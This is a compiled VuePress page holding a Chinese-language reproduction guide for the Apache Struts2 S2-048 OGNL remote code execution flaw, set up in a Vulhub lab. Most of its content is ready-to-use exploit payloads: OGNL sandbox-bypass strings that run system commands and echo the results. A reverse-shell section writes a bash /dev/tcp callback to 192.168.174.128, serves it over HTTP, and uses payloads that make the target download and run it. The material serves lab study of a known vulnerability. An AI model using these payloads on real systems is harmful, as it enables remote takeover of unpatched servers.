import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c,a as e,b as t,d as n,e as i}from"./app-58e4a7d6.js";const l={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),p=e("p",null,"漏洞详情:",-1),g={href:"http://struts.apache.org/docs/s2-048.html",target:"_blank",rel:"noopener noreferrer"},m={href:"http://bobao.360.cn/learning/detail/4078.html",target:"_blank",rel:"noopener noreferrer"},h={href:"http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/",target:"_blank",rel:"noopener noreferrer"},u={href:"http://xxlegend.com/2017/07/08/S2-048",target:"_blank",rel:"noopener noreferrer"},x=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: 2.0.0 - 2.3.32</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-048测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境是直接下载的struts-2.3.32的showcase，部署在tomcat-8.5下。环境启动后，访问<code>http://your-ip:8080/showcase/</code>即可查看到struts2的测试页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问Integration/Struts 1 Integration：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021129614.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>触发OGNL表达式的位置是<code>Gangster Name</code>这个表单。</p><p>输入<code>\${233*233}</code>即可查看执行结果（剩下两个表单随意填写）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021130080.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>借用S2-045的沙盒绕过方法改了一个POC。将如下POC填入表单<code>Gengster Name</code>中，提交即可直接回显命令执行的结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())).(#q)}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021130143.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当然，也可以直接用s2-045的POC（需要在Burp下进行测试）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;id&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021132734.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>使用s2-045的POC进行反弹shell。</p><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传shell.sh文件的Payload为（还需要进行URL编码）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;wget 192.168.174.128/shell.sh&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021133401.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的Payload为（还需要进行URL编码）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;bash shell.sh&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021134938.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,33);function b(v,_){const a=o("ExternalLinkIcon");return r(),c("div",null,[d,p,e("ul",null,[e("li",null,[e("a",g,[t("http://struts.apache.org/docs/s2-048.html"),n(a)])]),e("li",null,[e("a",m,[t("http://bobao.360.cn/learning/detail/4078.html"),n(a)])]),e("li",null,[t("["),e("a",h,[t("http://xxlegend.com/2017/07/08/S2-048 动态分析/"),n(a)]),t("]("),e("a",u,[t("http://xxlegend.com/2017/07/08/S2-048"),n(a)]),t(" 动态分析/)")])]),x])}const S=s(l,[["render",b],["__file","Struts2 S2-048 远程代码执行漏洞.html.vue"]]);export{S as default};
